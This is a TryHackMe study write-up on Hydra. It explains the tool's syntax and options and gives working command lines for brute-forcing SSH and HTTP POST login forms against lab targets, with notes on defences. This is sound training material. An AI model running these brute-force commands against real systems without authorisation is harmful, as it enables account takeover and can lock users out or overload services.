# Hydra - Password Brute Forcing

> **Platform:** TryHackMe
>
> **Room:** Password Attacks - Hydra
>
> **Category:** Password Attacks
>
> **Difficulty:** Easy
>
> **Tool:** Hydra
>
> **Focus:** Online Password Brute Forcing

---

# Introduction

Hydra is one of the most popular **online password brute-forcing tools** used during penetration testing.

It automates login attempts against numerous network services by trying passwords from a supplied wordlist. Instead of manually testing credentials, Hydra performs thousands of authentication attempts quickly using multiple threads.

Hydra is commonly used during **authorized security assessments** to identify weak or default passwords.

---

# Learning Objectives

- Understand what Hydra is
- Learn online password brute forcing
- Understand Hydra syntax
- Learn common Hydra options
- Brute force SSH logins
- Brute force HTTP POST login forms
- Recognize services supported by Hydra
- Understand password security best practices

---

# What is Hydra?

Hydra is an **online login password cracking tool**.

Unlike offline password crackers (such as John the Ripper or Hashcat), Hydra attempts to authenticate directly against a live service.

Hydra works by:

1. Connecting to a target service
2. Sending a username/password combination
3. Checking whether authentication succeeds
4. Repeating the process until a valid password is found or the wordlist is exhausted

---

# Online vs Offline Password Cracking

| Online Password Cracking | Offline Password Cracking |
|--------------------------|---------------------------|
| Attacks a live service | Attacks password hashes |
| Requires network connection | No network required |
| Can trigger account lockouts | No account lockouts |
| Slower | Usually much faster |
| Example: Hydra | Example: Hashcat, John the Ripper |

---

# Services Supported by Hydra

Hydra supports numerous authentication protocols, including:

- SSH
- FTP
- HTTP GET
- HTTP POST
- HTTPS Forms
- Telnet
- SMTP
- POP3
- IMAP
- SMB
- RDP
- VNC
- MySQL
- PostgreSQL
- MSSQL
- Oracle
- LDAP
- SNMP
- MongoDB
- SIP
- CVS
- IRC
- TeamSpeak
- VMware Authentication

Hydra supports **50+ authentication protocols**, making it one of the most versatile online brute-force tools.

---

# Why Hydra is Useful

Hydra helps identify:

- Weak passwords
- Default credentials
- Password reuse
- Misconfigured authentication systems
- Weak administrative accounts

Examples:

```
admin : admin

admin : password

root : root

user : 123456
```

---

# Basic Hydra Syntax

```
hydra [OPTIONS] TARGET SERVICE
```

General format:

```
hydra -l USERNAME -P WORDLIST TARGET SERVICE
```

---

# Common Hydra Options

| Option | Description |
|---------|-------------|
| `-l` | Single username |
| `-L` | Username list |
| `-p` | Single password |
| `-P` | Password wordlist |
| `-t` | Number of parallel threads |
| `-s` | Target port |
| `-V` | Verbose output |
| `-f` | Stop after first valid credential |
| `-o` | Save results to file |

---

# SSH Brute Force

Basic syntax:

```bash
hydra -l username -P passwords.txt MACHINE_IP ssh
```

Example:

```bash
hydra -l root -P rockyou.txt 10.10.10.10 ssh
```

Example with threads:

```bash
hydra -l root -P passwords.txt 10.10.10.10 -t 4 ssh
```

Explanation:

- `-l root` → Username
- `-P passwords.txt` → Password list
- `-t 4` → Four concurrent threads
- `ssh` → Target protocol

---

# HTTP POST Form Brute Force

Hydra can brute force web login forms that use the **POST** method.

General syntax:

```bash
hydra -l USERNAME -P WORDLIST MACHINE_IP http-post-form "<path>:<parameters>:<failure_string>"
```

Example:

```bash
hydra -l admin -P passwords.txt MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect"
```

---

# Understanding HTTP POST Syntax

```
/:username=^USER^&password=^PASS^:F=incorrect
```

Breakdown:

### Login Path

```
/
```

Location of login page.

Examples:

```
/

login.php

admin/login.php

signin
```

---

### Form Parameters

```
username=^USER^&password=^PASS^
```

Hydra replaces:

```
^USER^

↓

admin
```

```
^PASS^

↓

password123
```

Hydra submits:

```
username=admin
password=password123
```

---

### Failure String

```
F=incorrect
```

Hydra looks for this text in the response.

If found:

```
Login Failed
```

Hydra continues testing.

If **not found**, Hydra assumes authentication succeeded.

Common failure strings:

```
incorrect

invalid

login failed

wrong password

authentication failed

try again
```

---

# Verbose Mode

```
-V
```

Displays every login attempt.

Example:

```bash
hydra -l admin -P passwords.txt MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```

---

# Custom Port

If the application runs on a non-default port:

```bash
hydra -l admin -P passwords.txt MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -s 8080
```

---

# Finding Login Parameters

Before using Hydra, determine:

- Login URL
- HTTP method (GET or POST)
- Form field names
- Failure message

Common methods:

- Browser Developer Tools
- Burp Suite
- Page source inspection

---

# Hydra Workflow

Recon

↓

Identify authentication service

↓

Collect usernames

↓

Obtain password wordlist

↓

Determine request parameters

↓

Run Hydra

↓

Analyze results

---

# Example Attack Flow

Target:

```
SSH
```

Username:

```
admin
```

Wordlist:

```
rockyou.txt
```

Command:

```bash
hydra -l admin -P rockyou.txt MACHINE_IP ssh
```

Hydra attempts:

```
admin : 123456

admin : password

admin : qwerty

admin : admin123

...

admin : CorrectPassword
```

Upon success:

```
[22][ssh] host: MACHINE_IP login: admin password: CorrectPassword
```

---

# Threading

Hydra uses multiple threads for faster testing.

Example:

```bash
-t 4
```

Meaning:

```
4 simultaneous login attempts
```

Higher thread counts increase speed but may:

- Trigger IDS/IPS
- Cause account lockouts
- Increase server load

---

# Best Practices (Authorized Testing)

✔ Obtain written authorization before testing.

✔ Use strong, unique passwords to mitigate brute-force risks.

✔ Limit request rates to avoid disrupting services.

✔ Monitor for account lockout policies.

✔ Document successful findings and recommend mitigations.

---

# Common Mistakes

❌ Incorrect login URL

❌ Wrong HTTP method

❌ Incorrect form parameter names

❌ Wrong failure string

❌ Incorrect port

❌ Invalid username

❌ Empty wordlist

---

# Defensive Measures

Organizations can reduce brute-force risk by:

- Strong password policies
- Multi-Factor Authentication (MFA)
- Account lockout after repeated failures
- Rate limiting
- CAPTCHA
- IP reputation and blocking
- Logging and monitoring authentication attempts
- Disabling default credentials

---

# Key Takeaways

- Hydra is a fast **online password brute-forcing tool**.
- It supports **50+ authentication protocols**, including SSH, FTP, HTTP, SMB, RDP, and databases.
- Successful brute forcing depends on knowing the correct login endpoint, request parameters, and failure conditions.
- Multi-threading improves speed but should be used responsibly during authorized engagements.
- Strong passwords, MFA, and account lockout mechanisms are effective defenses against brute-force attacks.
